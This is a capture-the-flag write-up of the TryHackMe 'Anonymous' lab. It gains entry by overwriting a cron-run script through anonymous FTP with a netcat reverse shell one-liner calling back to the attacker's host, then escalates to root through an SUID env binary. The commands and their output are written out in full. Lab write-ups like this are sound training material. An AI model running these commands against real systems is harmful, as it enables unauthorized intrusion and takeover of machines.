---
title: "Anonymous TryHackMe Write Up"
last_modified_at: 2020-09-19T14:40:02-05:00
categories:
  - thm
author_profile: false
tags:
  - thm
  - Linux
  - gtfobins
  - ftp
---

Anonymous is a medium rated room in tryhackme which has a anonymous login enabled in ftp which has a folder called scripts in which anyone can write a file. It also has a script which is continuously being executed probably as a cron job. So we overwrite this script to get a reverse shell. Inside the box, we exploited the binary `env` which had SUID bit enabled to get a root shell.

Room Link : [https://tryhackme.com/room/anonymous](https://tryhackme.com/room/anonymous)

# Port Scan
```console
local@local:~/Documents/tryhackme/anonymous$ nmap -oN initial 10.10.144.74
Nmap scan report for 10.10.144.74
Host is up (0.42s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

# Nmap done at Sat Sep 19 19:56:01 2020 -- 1 IP address (1 host up) scanned in 55.17 seconds
```

# Trying Anonymous login on ftp
```console
ftp 10.10.144.74       
Connected to 10.10.144.74.                
220 NamelessOne's FTP Server!                                                           
Name (10.10.144.74:local): anonymous   
331 Please specify the password.          
Password:                                 
230 Login successful.                     
Remote system type is UNIX.               
Using binary mode to transfer files.                                                    
ftp> dir -a                                                                             
200 PORT command successful. Consider using PASV.              
150 Here comes the directory listing.                                                                                                                                           
drwxr-xr-x    3 65534    65534        4096 May 13 19:49 .        
drwxr-xr-x    3 65534    65534        4096 May 13 19:49 ..                              
drwxrwxrwx    2 111      113          4096 Jun 04 19:26 scripts                         
226 Directory send OK.                                   
```
And the anonymous login is enabled and we can see there is directory called scripts with permissions 777, which means anyone can read, write and execute files on the scripts folder.

## Checking the content of scripts folder
```console
ftp> dir -a                                                                             
200 PORT command successful. Consider using PASV.                                       
150 Here comes the directory listing.                                                   
drwxrwxrwx    2 111      113          4096 Jun 04 19:26 .                               
drwxr-xr-x    3 65534    65534        4096 May 13 19:49 ..                              
-rwxr-xrwx    1 1000     1000          314 Jun 04 19:24 clean.sh                        
-rw-rw-r--    1 1000     1000          946 Sep 19 13:59 removed_files.log                                                                                                       
-rw-r--r--    1 1000     1000           68 May 12 03:50 to_do.txt
226 Directory send OK.                                                                  
```

Lets download all the files to our local box.
```console
ftp> get clean.sh                                                                                                                                                               
local: clean.sh remote: clean.sh                                                        
200 PORT command successful. Consider using PASV.                                       
150 Opening BINARY mode data connection for clean.sh (314 bytes).                                                                                                               
226 Transfer complete.                                                                                                                                                          
314 bytes received in 0.00 secs (1.6823 MB/s)                     
ftp> get to_do.txt                                                                      
local: to_do.txt remote: to_do.txt                                                      
200 PORT command successful. Consider using PASV.                                       
150 Opening BINARY mode data connection for to_do.txt (68 bytes).
226 Transfer complete.
68 bytes received in 0.00 secs (288.7228 kB/s)
ftp> get removed_files.log
local: removed_files.log remote: removed_files.log
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for removed_files.log (946 bytes).
226 Transfer complete.
946 bytes received in 0.00 secs (5.0401 MB/s)
```

## Contents of to_do.txt
```console
local@local:~/Documents/tryhackme/anonymous/ftp$ cat to_do.txt 
I really need to disable the anonymous login...it's really not safe
```
We exploited the anonymous login vulnerability to get into the system.

## Content of clean.sh
```console
local@local:~/Documents/tryhackme/anonymous/ftp$ cat clean.sh 
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```
Looks like some cleaning script.

## Contents of removed_files.log
```console
local@local:~/Documents/tryhackme/anonymous/ftp$ cat removed_files.log 
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
```

The interesting thing about the content of the file is that this is generated from the clean.sh and looking at the output the script is executed multiple times. This means that the script `clean.sh` might be running continously as cronjob. As we have write permission on that folder, we can write our own `clean.sh` with reverse shell.

## Content of new clean.sh
```console
local@local:~/Documents/tryhackme/anonymous$ cat clean.sh 
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.3.202 9001 >/tmp/f
```

## Listening on port 9001 on local box
```console
local@local:~/Documents/tryhackme/anonymous$ nc -nvlp 9001                                                                                                                
Listening on [0.0.0.0] (family 2, port 9001)                                                                                                                                    
Listening on 0.0.0.0 9001  
```

## Uploading the new `clean.sh`
```console
ftp> put clean.sh
local: clean.sh remote: clean.sh
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
574 bytes sent in 0.00 secs (6.5168 MB/s)
```

After some time we got a shell.
```console
local@local:~/Documents/tryhackme/anonymous$ nc -nvlp 9001                                                                                                                
Listening on [0.0.0.0] (family 2, port 9001)                                            
Listening on 0.0.0.0 9001                                                               
Connection received on 10.10.144.74 47542                                               
/bin/sh: 0: can't access tty; job control turned off                              
$
```
## Getting a proper shell
```console
$ python -c "import pty;pty.spawn('/bin/bash')"                                  
namelessone@anonymous:~$
```
Hit CTRL + z to background the current process and type
```console
local@local:~/Documents/tryhackme/anonymous$ stty raw -echo
```
And type `fg` and hit enter twice and export TERM variable on the reverse shell.
```console
namelessone@anonymous:~$ export TERM=xterm 
```
Now we got a proper shell with autocompletion.

## Reading User flag
```console
namelessone@anonymous:~$ ls                                                                                                                                                     
pics  user.txt                                                                          
namelessone@anonymous:~$ cat user.txt                                                   
90d6f************************4740
```

# Privilege Escalation
Before running scripts like linpeas and LinEnum, I like to do basic Enumeration.

## Checking sudo privileges
```console
namelessone@anonymous:~$ sudo -l                                                                                                                                     [1588/2782]
[sudo] password for namelessone:                                                                                                                                                
Sorry, try again.                                                                                                                                                               
[sudo] password for namelessone:                                                        
sudo: 1 incorrect password attempt  
```
## Checking for SUID binaries
```console
namelessone@anonymous:~$ find / -type f -perm -4000 2>/dev/null | grep -i env
/usr/bin/env
```
As soon as I saw env with SUID bit activated, I went to [gtfobins](https://gtfobins.github.io/gtfobins/env/#suid) to check whether this can be used to escalate my privilege to root and turns out I can.
I havenot listed all the binaries with SUID bit enabled here.

## Getting root shell
```console
namelessone@anonymous:~$ which env
/usr/bin/env
namelessone@anonymous:~$ /usr/bin/env /bin/sh -p
# id
id
uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

## Reading root flag
```console
# cd /root
# cat root.txt
4d93************************f363
```